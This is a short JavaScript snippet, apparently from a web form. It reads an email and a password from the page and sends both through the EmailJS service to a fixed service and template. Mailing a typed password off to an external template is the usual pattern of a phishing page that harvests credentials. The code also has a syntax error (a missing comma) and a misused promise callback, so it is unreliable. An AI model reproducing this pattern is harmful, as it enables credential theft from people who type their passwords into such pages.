function sendmail(){
    let parms = {
        emailjs : document.getElementById("email").value,
        password : document.getElementById("password").value,
    }

    emailjs.send("service_bo3j9pu","template_9zl4l3s" parms). then(alert("Email Sent!!"))
}